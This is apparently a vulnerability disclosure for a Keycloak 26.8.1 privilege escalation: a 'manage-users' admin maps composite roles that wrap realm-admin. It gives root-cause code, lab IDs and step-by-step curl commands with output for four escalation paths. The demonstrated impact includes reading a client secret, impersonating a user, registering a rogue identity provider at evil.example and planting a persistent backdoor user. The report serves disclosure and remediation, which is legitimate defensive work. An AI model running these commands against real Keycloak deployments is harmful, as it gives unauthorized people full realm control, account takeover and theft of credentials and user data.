
---

### Summary

Keycloak 26.8.1 hardened **group join** so a `manage-users` admin cannot add a user to a group that transitively grants `realm-management` admin roles (`AdminRoles.isAdminRoleOrComposite` / `GroupUtils.checkAdminGroupRoles`). That is CVE-2026-94000.

**Role mapping did not get the same walk.** `RolePermissionsV2.canMapRole` treats a role as privileged only when the posted role’s container is `realm-management`/`master` **and** its **name** is in `AdminRoles.ALL_ROLES`. A composite whose name is ordinary (`sneaky-composite`, `outer-sneaky`, `spa/hidden-ra`) but whose children include `realm-management/realm-admin` is treated as a normal mappable role.

A caller who holds only `manage-users` can therefore:

1. Map the wrapper onto **themselves** and immediately become `realm-admin`.
2. Map a **nested** wrapper (`outer-sneaky` → `sneaky-composite` → `realm-admin`) onto any user.
3. Map a **client role on a non-admin client** (`spa/hidden-ra`) that composites `realm-admin`.
4. Map the wrapper onto a **group that already has members** — existing members become `realm-admin` without a join. New joins stay 403 (the 26.8.1 fix).

After any successful map, a fresh token is full realm-admin: create clients and IdPs, read client secrets, impersonate any user, list every email, plant a persistent backdoor user.

---

### Lab IDs (reproduced 2026-10-22)

| Object | ID |
|---|---|
| Realm `app` | `0a85b4f4-4f91-4a15-a48d-553ccab85f56` |
| `limited-admin` | `60358dd0-0767-4fad-884a-7749bd5c3371` |
| `alice` | `c620a6c1-9b23-4bdd-953b-f7e83ab69eb8` |
| `bob` | `205ca375-49d8-4264-8ae4-7017cab9d435` |
| `carol` | `24dc6510-cb41-4c53-8ad4-d4b8833a8cce` |
| `rootish` (backdoor, created during impact) | `27c2c62f-ed3c-4bfe-8a4f-f0fe7c97f8ab` |
| Client `realm-management` | `52ad1101-df11-4c44-b104-9e9a8be3b910` |
| Role `realm-admin` | `9c9092bb-95e7-417c-a780-a297923b393d` |
| Realm role `sneaky-composite` | `f05ab3cb-ea92-4668-81eb-4837d1417b37` |
| Realm role `outer-sneaky` | `d3bda5fa-91bb-46a1-818a-ec0daa9268e8` |
| Client `spa` | `e68aacb9-cd23-4dda-8320-8085ce586c57` |
| Client role `spa/hidden-ra` | `5333ddd2-1055-4a78-bb42-df5e33f97e06` |
| Group `helpdesk` | `45068d5a-dcb6-4ff3-a714-2892bc0b0331` |
| Client `confidential` | `d6f3b2ee-59ec-4743-b83d-5aaae9acb0dc` |
| Role `default-roles-app` | `b455bcd8-5685-483f-845d-ba85fb4d7a62` |

**Payloads**

- `sneaky-composite` — realm role whose composites include `realm-management/realm-admin`
- `outer-sneaky` — realm role whose composites include `sneaky-composite` (one extra hop)
- `spa/hidden-ra` — client role on a non-admin OIDC client whose composites include `realm-admin`

---

### Root cause

**CVE-2026-94000 walk (group join only)** — `GroupUtils.checkAdminGroupRoles` recursively requires `canMapRole` on every nested admin role:

```251:272:src-26.8.1/services/src/main/java/org/keycloak/utils/GroupUtils.java
    public static void checkAdminGroupRoles(GroupModel group, AdminPermissionEvaluator auth) {
        if (!AdminRoles.groupHasAdminRoles(group)) {
            return;
        }
        GroupModel current = group;
        while (current != null) {
            current.getRoleMappingsStream().forEach(role -> requireMapRoleRecursive(role, auth, new HashSet<>()));
            current = current.getParent();
        }
    }

    private static void requireMapRoleRecursive(RoleModel role, AdminPermissionEvaluator auth, Set<String> visited) {
        if (!visited.add(role.getId())) {
            return;
        }
        if (AdminRoles.isAdminRole(role)) {
            auth.roles().requireMapRole(role);
        }
        if (role.isComposite()) {
            role.getCompositesStream().forEach(child -> requireMapRoleRecursive(child, auth, visited));
        }
    }
```

**Missed check (user + group role-mapping)** — `RoleMapperResource.addRealmRoleMappings` calls `requireMapRole` on the posted role only:

```278:291:src-26.8.1/services/src/main/java/org/keycloak/services/resources/admin/RoleMapperResource.java
    public void addRealmRoleMappings(@Parameter(description = "Roles to add") List<RoleRepresentation> roles) {
        managePermission.require();
        // ...
            for (RoleRepresentation role : roles) {
                RoleModel roleModel = realm.getRole(role.getName());
                // ...
                auth.roles().requireMapRole(roleModel);
                roleMapper.grantRole(roleModel);
            }
```

The same `RoleMapperResource` is mounted on groups (`GroupResource.getRoleMappings`) and **never** calls `checkAdminGroupRoles`.

**Name/container gate** — `RolePermissionsV2.canMapRole` only special-cases true admin roles; everything else is allowed for `manage-users`:

```49:62:src-26.8.1/services/src/main/java/org/keycloak/services/resources/admin/fgap/RolePermissionsV2.java
    public boolean canMapRole(RoleModel role) {
        if (isRealmAdminRole(role)) {
            if (realm.isAdminPermissionsEnabled()) {
                return root.isRealmAdmin();
            }
            return root.hasOneAdminRole(AdminRoles.MANAGE_USERS) && checkAdminRoles(role);
        }

        if (root.hasOneAdminRole(AdminRoles.MANAGE_USERS)) {
            // user has manage-users, so they can map any non-admin role
            return true;
        }
```

`isRealmAdminRole` is container + `ALL_ROLES.contains(name)`. A composite named `sneaky-composite` is never an admin role by this test, even when it wraps `realm-admin`.

`RolePermissions.checkAdminRoles` also keys only on `AdminRoles.ALL_ROLES.contains(role.getName())` and does not walk composites.

`ClientRoleMappingsResource.addClientRoleMapping` uses the same `canMapRole` gate, so a client role on `spa` that composites `realm-admin` is also mappable.

---

### Precondition (realm-admin / master admin)

These objects already existed in the lab. Recreate them on a clean 26.8.1 as a true realm-admin:

```bash
BASE=http://127.0.0.1:8080

ADMIN_TOK=$(curl -s -X POST "$BASE/realms/master/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password -d username=admin -d password=admin \
  | jq -r .access_token)

# realm-management client + realm-admin role
RM=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/clients?clientId=realm-management" | jq -r '.[0].id')
RA=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/clients/$RM/roles/realm-admin" | jq -r .id)

# 1) realm wrapper
curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"sneaky-composite","description":"hides realm-admin"}'
SNEAKY=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/roles/sneaky-composite" | jq -r .id)
curl -sD - -X POST "$BASE/admin/realms/app/roles-by-id/$SNEAKY/composites" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$RA\",\"name\":\"realm-admin\"}]"
# HTTP/1.1 204

# 2) nested wrapper
curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"outer-sneaky","description":"wraps sneaky-composite"}'
OUTER=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/roles/outer-sneaky" | jq -r .id)
curl -sD - -X POST "$BASE/admin/realms/app/roles-by-id/$OUTER/composites" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$SNEAKY\",\"name\":\"sneaky-composite\"}]"
# HTTP/1.1 204

# 3) client-role wrapper on spa
SPA=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/clients?clientId=spa" | jq -r '.[0].id')
curl -sD - -X POST "$BASE/admin/realms/app/clients/$SPA/roles" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"hidden-ra","description":"client-role wrapper of realm-admin"}'
HID=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/clients/$SPA/roles/hidden-ra" | jq -r .id)
curl -sD - -X POST "$BASE/admin/realms/app/roles-by-id/$HID/composites" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$RA\",\"name\":\"realm-admin\"}]"
# HTTP/1.1 204

# 4) helpdesk group with alice already a member (for Attack D)
curl -sD - -X POST "$BASE/admin/realms/app/groups" \
  -H "Authorization: Bearer $ADMIN_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"helpdesk"}'
HELP=$(curl -s -H "Authorization: Bearer $ADMIN_TOK" \
  "$BASE/admin/realms/app/groups?search=helpdesk" | jq -r '.[0].id')
ALICE=c620a6c1-9b23-4bdd-953b-f7e83ab69eb8
curl -sD - -X PUT "$BASE/admin/realms/app/users/$ALICE/groups/$HELP" \
  -H "Authorization: Bearer $ADMIN_TOK"
# HTTP/1.1 204
```

Threat model matches CVE-2026-94000: the composite already exists (created by a realm-admin, an import, or an earlier process). The bug is that `manage-users` can **assign** it.

---

### Steps to reproduce

Set these once. `$TOKEN` is always `limited-admin` **before** self-escalation.

```bash
BASE=http://127.0.0.1:8080
LA=60358dd0-0767-4fad-884a-7749bd5c3371
ALICE=c620a6c1-9b23-4bdd-953b-f7e83ab69eb8
BOB=205ca375-49d8-4264-8ae4-7017cab9d435
CAROL=24dc6510-cb41-4c53-8ad4-d4b8833a8cce
RM=52ad1101-df11-4c44-b104-9e9a8be3b910
RA=9c9092bb-95e7-417c-a780-a297923b393d
SNEAKY=f05ab3cb-ea92-4668-81eb-4837d1417b37
OUTER=d3bda5fa-91bb-46a1-818a-ec0daa9268e8
SPA=e68aacb9-cd23-4dda-8320-8085ce586c57
HID=5333ddd2-1055-4a78-bb42-df5e33f97e06
HELP=45068d5a-dcb6-4ff3-a714-2892bc0b0331
CONF=d6f3b2ee-59ec-4743-b83d-5aaae9acb0dc
DEF=b455bcd8-5685-483f-845d-ba85fb4d7a62

TOKEN=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=limited-admin -d password=limitedpass | jq -r .access_token)
```

#### 0) PRE — `manage-users` cannot administer the realm

```bash
curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"name":"should-fail-pre"}'
# HTTP/1.1 403 Forbidden
# {"error":"HTTP 403 Forbidden"}

curl -sD - -X POST "$BASE/admin/realms/app/clients" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"clientId":"pwned-client-pre"}'
# HTTP/1.1 403 Forbidden

curl -sD - -X POST "$BASE/admin/realms/app/identity-provider/instances" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"alias":"pwn-idp-pre","providerId":"oidc"}'
# HTTP/1.1 403 Forbidden

curl -sD - -X POST "$BASE/admin/realms/app/users/$BOB/impersonation" \
  -H "Authorization: Bearer $TOKEN"
# HTTP/1.1 403 Forbidden
```

#### 1) CONTROL — direct `realm-admin` map is denied

```bash
curl -sD - -X POST "$BASE/admin/realms/app/users/$LA/role-mappings/clients/$RM" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$RA\",\"name\":\"realm-admin\"}]"
# HTTP/1.1 403 Forbidden
# {"error":"HTTP 403 Forbidden"}

curl -sD - -X POST "$BASE/admin/realms/app/users/$BOB/role-mappings/clients/$RM" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$RA\",\"name\":\"realm-admin\"}]"
# HTTP/1.1 403 Forbidden

curl -sD - -X POST "$BASE/admin/realms/app/users/$CAROL/role-mappings/clients/$RM" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$RA\",\"name\":\"realm-admin\"}]"
# HTTP/1.1 403 Forbidden
```

#### 2) CONTROL — group **join** after the group already carries `sneaky-composite` is denied (CVE-2026-94000)

```bash
curl -sD - -X PUT "$BASE/admin/realms/app/users/$BOB/groups/$HELP" \
  -H "Authorization: Bearer $TOKEN"
# HTTP/1.1 403 Forbidden
# {"error":"HTTP 403 Forbidden"}
```

#### 3) CONTROL — adding the wrapper as a composite of `default-roles-app` is denied (`canMapComposite`)

```bash
curl -sD - -X POST "$BASE/admin/realms/app/roles-by-id/$DEF/composites" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$SNEAKY\",\"name\":\"sneaky-composite\"}]"
# HTTP/1.1 403 Forbidden
```

#### 4) UI — wrapper roles are listed as mappable for `manage-users`

```bash
curl -s "$BASE/admin/realms/app/users/$BOB/role-mappings/realm/available" \
  -H "Authorization: Bearer $TOKEN" | jq '.[].name'
# "pwned-by-bob"
# "sneaky-composite"
# "pwned-by-bob-2"
# "uma_authorization"
# "offline_access"
# "outer-sneaky"

curl -s "$BASE/admin/realms/app/users/$CAROL/role-mappings/clients/$SPA/available" \
  -H "Authorization: Bearer $TOKEN" | jq '.[].name'
# "hidden-ra"
```

---

### Attack A — self-assign `sneaky-composite` → full realm-admin

```bash
curl -sD - -X POST "$BASE/admin/realms/app/users/$LA/role-mappings/realm" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$SNEAKY\",\"name\":\"sneaky-composite\"}]"
# HTTP/1.1 204 No Content
```

Effective `realm-management` composites on `limited-admin` immediately include:

```
create-client, impersonation, manage-authorization, manage-clients, manage-events,
manage-identity-providers, manage-organizations, manage-realm, manage-users,
query-clients, query-groups, query-organizations, query-realms, query-users,
realm-admin, view-authorization, view-clients, view-events, view-identity-providers,
view-organizations, view-realm, view-users
```

Mint a **new** token (the old JWT does not contain the new roles):

```bash
TOKEN2=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=limited-admin -d password=limitedpass | jq -r .access_token)
```

**Impact A — demonstrated on the new token**

Create a realm role:

```bash
curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $TOKEN2" -H 'Content-Type: application/json' \
  -d '{"name":"pwned-by-limited-self"}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/roles/pwned-by-limited-self
```

Create a confidential client:

```bash
curl -sD - -X POST "$BASE/admin/realms/app/clients" \
  -H "Authorization: Bearer $TOKEN2" -H 'Content-Type: application/json' \
  -d '{"clientId":"pwned-by-limited","protocol":"openid-connect","secret":"pwnedsecret","publicClient":false,"redirectUris":["https://evil.example/cb"],"directAccessGrantsEnabled":true}'
# HTTP/1.1 201 Created
```

Create an identity provider:

```bash
curl -sD - -X POST "$BASE/admin/realms/app/identity-provider/instances" \
  -H "Authorization: Bearer $TOKEN2" -H 'Content-Type: application/json' \
  -d '{"alias":"pwned-idp-by-limited","providerId":"oidc","enabled":true,"config":{"authorizationUrl":"https://evil.example/auth","tokenUrl":"https://evil.example/token","clientId":"evil","clientSecret":"evilsecret"}}'
# HTTP/1.1 201 Created
```

List every user email:

```bash
curl -s "$BASE/admin/realms/app/users?max=20" \
  -H "Authorization: Bearer $TOKEN2" | jq '[.[]|{username,email}]'
```

```json
[
  {"username":"alice","email":"alice@example.com"},
  {"username":"bob","email":"bob@example.com"},
  {"username":"carol","email":"carol@example.com"},
  {"username":"dave","email":"dave@example.com"},
  {"username":"eveunauth","email":"eveunauth@example.com"},
  {"username":"limited-admin","email":"limited@example.com"},
  {"username":"samlunauth1","email":"samlunauth1@example.com"}
]
```

Steal the confidential client secret:

```bash
curl -s "$BASE/admin/realms/app/clients/$CONF/client-secret" \
  -H "Authorization: Bearer $TOKEN2"
# {"type":"secret","value":"confsecret"}
```

Impersonate bob (session cookie issued for bob’s `sub`):

```bash
curl -sD - -X POST "$BASE/admin/realms/app/users/$BOB/impersonation" \
  -H "Authorization: Bearer $TOKEN2"
```

```
HTTP/1.1 200 OK
Set-Cookie: KEYCLOAK_IDENTITY=eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI1ZWMwNDRlMy01MDFhLTQ2ZWEtOGE3OC00NTU2NzI5YmM4YTUifQ....sub=205ca375-49d8-4264-8ae4-7017cab9d435...
Set-Cookie: KEYCLOAK_SESSION=...
Content-Type: application/json;charset=UTF-8

{"redirect":"http://127.0.0.1:8080/realms/app/account","sameRealm":true}
```

Plant a persistent backdoor user and grant them the same wrapper:

```bash
curl -sD - -X POST "$BASE/admin/realms/app/users" \
  -H "Authorization: Bearer $TOKEN2" -H 'Content-Type: application/json' \
  -d '{"username":"rootish","enabled":true,"firstName":"Root","lastName":"Ish","email":"rootish@example.com","emailVerified":true,"credentials":[{"type":"password","value":"rootishpass","temporary":false}]}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/users/27c2c62f-ed3c-4bfe-8a4f-f0fe7c97f8ab

curl -sD - -X POST "$BASE/admin/realms/app/users/27c2c62f-ed3c-4bfe-8a4f-f0fe7c97f8ab/role-mappings/realm" \
  -H "Authorization: Bearer $TOKEN2" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$SNEAKY\",\"name\":\"sneaky-composite\"}]"
# HTTP/1.1 204 No Content

ROOT_TOK=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=rootish -d password=rootishpass | jq -r .access_token)

curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $ROOT_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"pwned-by-rootish-backdoor"}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/roles/pwned-by-rootish-backdoor
```

---

### Attack B — nested composite onto bob (`outer-sneaky` → `sneaky-composite` → `realm-admin`)

Run this with the **original** `manage-users` token (`$TOKEN`), without self-escalation.

```bash
curl -sD - -X POST "$BASE/admin/realms/app/users/$BOB/role-mappings/realm" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$OUTER\",\"name\":\"outer-sneaky\"}]"
# HTTP/1.1 204 No Content
```

Bob’s realm mappings after the map: `default-roles-app`, `outer-sneaky`.

```bash
BOB_TOK=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=bob -d password=bobpass | jq -r .access_token)

curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $BOB_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"pwned-by-bob-nested"}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/roles/pwned-by-bob-nested

curl -sD - -X POST "$BASE/admin/realms/app/identity-provider/instances" \
  -H "Authorization: Bearer $BOB_TOK" -H 'Content-Type: application/json' \
  -d '{"alias":"pwned-idp-by-bob","providerId":"oidc","enabled":true,"config":{"authorizationUrl":"https://evil.example/auth","tokenUrl":"https://evil.example/token","clientId":"x","clientSecret":"y"}}'
# HTTP/1.1 201 Created
```

One extra composite hop is enough. Depth is not checked.

---

### Attack C — client-role wrapper on a non-admin client (`spa/hidden-ra`)

Carol cannot create roles **before** the map:

```bash
CAROL_PRE=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=carol -d password=carolpass | jq -r .access_token)

curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $CAROL_PRE" -H 'Content-Type: application/json' \
  -d '{"name":"carol-pre"}'
# HTTP/1.1 403 Forbidden
# {"error":"HTTP 403 Forbidden"}
```

`manage-users` maps `spa/hidden-ra` (which composites `realm-admin`):

```bash
curl -sD - -X POST "$BASE/admin/realms/app/users/$CAROL/role-mappings/clients/$SPA" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$HID\",\"name\":\"hidden-ra\"}]"
# HTTP/1.1 204 No Content
```

Carol after the map:

```bash
CAROL_TOK=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=carol -d password=carolpass | jq -r .access_token)

curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $CAROL_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"pwned-by-carol-clientrole"}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/roles/pwned-by-carol-clientrole

curl -sD - -X POST "$BASE/admin/realms/app/clients" \
  -H "Authorization: Bearer $CAROL_TOK" -H 'Content-Type: application/json' \
  -d '{"clientId":"pwned-by-carol","protocol":"openid-connect","publicClient":true}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/clients/272b5c64-6228-4c42-b39d-17538145eecb
```

The wrapper does not have to be a realm role. Any client role whose name is outside `AdminRoles.ALL_ROLES` works.

---

### Attack D — map `sneaky-composite` onto a group that already has members

CVE-2026-94000 blocks **joining** a new user to a group that already carries admin roles. Mapping the wrapper **onto the group** is a different API (`RoleMapperResource` on `GroupResource`) and is allowed.

Alice is already in `helpdesk`. Before the map she cannot create roles:

```bash
ALICE_PRE=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=alice -d password=alicepass | jq -r .access_token)

curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $ALICE_PRE" -H 'Content-Type: application/json' \
  -d '{"name":"alice-pre-should-fail"}'
# HTTP/1.1 403 Forbidden
```

`manage-users` maps the wrapper onto the group:

```bash
curl -sD - -X POST "$BASE/admin/realms/app/groups/$HELP/role-mappings/realm" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "[{\"id\":\"$SNEAKY\",\"name\":\"sneaky-composite\"}]"
# HTTP/1.1 204 No Content
```

Alice (existing member, no user-level map) is now realm-admin:

```bash
ALICE_TOK=$(curl -s -X POST "$BASE/realms/app/protocol/openid-connect/token" \
  -d client_id=admin-cli -d grant_type=password \
  -d username=alice -d password=alicepass | jq -r .access_token)

curl -sD - -X POST "$BASE/admin/realms/app/roles" \
  -H "Authorization: Bearer $ALICE_TOK" -H 'Content-Type: application/json' \
  -d '{"name":"pwned-by-alice-via-group"}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/roles/pwned-by-alice-via-group

curl -sD - -X POST "$BASE/admin/realms/app/clients" \
  -H "Authorization: Bearer $ALICE_TOK" -H 'Content-Type: application/json' \
  -d '{"clientId":"pwned-by-alice-group","protocol":"openid-connect","publicClient":true}'
# HTTP/1.1 201 Created
# Location: http://127.0.0.1:8080/admin/realms/app/clients/9086501c-2db6-43f7-8f52-44080991ba34
```

Join of a **new** member still fails (the 26.8.1 fix):

```bash
curl -sD - -X PUT "$BASE/admin/realms/app/users/$BOB/groups/$HELP" \
  -H "Authorization: Bearer $TOKEN"
# HTTP/1.1 403 Forbidden
```

Blast radius: every current member of any group the delegated admin can manage.

---

### Result matrix (live 26.8.1)

| Step | Actor | Action | HTTP |
|---|---|---|---|
| PRE | limited-admin | `POST /roles`, `/clients`, `/identity-provider`, impersonate bob | **403** |
| CONTROL | limited-admin | map `realm-admin` on self / bob / carol | **403** |
| CONTROL | limited-admin | join bob to `helpdesk` after it has sneaky | **403** |
| CONTROL | limited-admin | add sneaky as composite of `default-roles-app` | **403** |
| A | limited-admin | map `sneaky-composite` onto self | **204** |
| A impact | limited-admin (new token) | create role / client / IdP | **201** |
| A impact | limited-admin | `GET /users` emails | **200** |
| A impact | limited-admin | `GET` confidential client secret `confsecret` | **200** |
| A impact | limited-admin | impersonate bob (`KEYCLOAK_IDENTITY` sub=bob) | **200** |
| A impact | limited-admin | create `rootish` + map sneaky | **201** / **204** |
| A impact | rootish | `POST /roles` `pwned-by-rootish-backdoor` | **201** |
| B | limited-admin | map `outer-sneaky` onto bob | **204** |
| B impact | bob | `POST /roles` `pwned-by-bob-nested` | **201** |
| B impact | bob | create IdP `pwned-idp-by-bob` | **201** |
| C | carol | `POST /roles` before map | **403** |
| C | limited-admin | map `spa/hidden-ra` onto carol | **204** |
| C impact | carol | `POST /roles` `pwned-by-carol-clientrole` | **201** |
| C impact | carol | `POST /clients` `pwned-by-carol` | **201** |
| D | alice | `POST /roles` before group map | **403** |
| D | limited-admin | map sneaky onto `helpdesk` | **204** |
| D impact | alice | `POST /roles` `pwned-by-alice-via-group` | **201** |
| D impact | alice | `POST /clients` `pwned-by-alice-group` | **201** |

---

### Impact

A delegated realm admin who only holds `manage-users` can become, or mint, full `realm-admin` whenever any composite wrapping `realm-management` admin roles exists — including a nested wrapper and a client role on an unrelated client.

Concrete attacker capabilities demonstrated on Keycloak 26.8.1:

- Self-escalate to `realm-admin`
- Escalate any user (bob via nested composite, carol via client-role wrapper)
- Escalate every current member of a manageable group (alice via `helpdesk`) without joining anyone
- Create OIDC clients and identity providers
- Read the confidential client secret (`confsecret`)
- Impersonate bob (`KEYCLOAK_IDENTITY` issued for bob’s user id)
- List every user email in the realm
- Plant a persistent backdoor user (`rootish` / `rootishpass`) who then created realm role `pwned-by-rootish-backdoor`

---

### Real-world parallel

- **Keycloak CVE-2026-94000** / 26.8.1 `RealmAdminAccessTest.testManageUsersAdminCannotJoinUserToGroupWithCompositeAdminRole` — same composite-hidden admin role class, closed only on group **join**. Missed `RoleMapperResource` (users + groups) and `ClientRoleMappingsResource`.
- Delegated-admin → instance-admin via composite / group role mapping (GitLab / Slack class of BAC).

---

### Remediation

1. In `RolePermissionsV2.canMapRole` / `RolePermissions.checkAdminRoles`, reject a role if `AdminRoles.isAdminRoleOrComposite(role)` is true, then apply the existing per-admin-role privilege checks to **every nested** admin role (mirror `GroupUtils.requireMapRoleRecursive`).
2. That walk must run for:
   - `RoleMapperResource.addRealmRoleMappings` (users **and** groups)
   - `ClientRoleMappingsResource.addClientRoleMapping`
3. Add `RealmAdminAccessTest` coverage that `manage-users` cannot:
   - `POST` `sneaky-composite` onto a user (including self)
   - `POST` a nested wrapper (`outer-sneaky`)
   - `POST` a non-admin-client role that composites `realm-admin`
   - `POST` the wrapper onto a group that already has members
4. The existing group-join test is not sufficient.
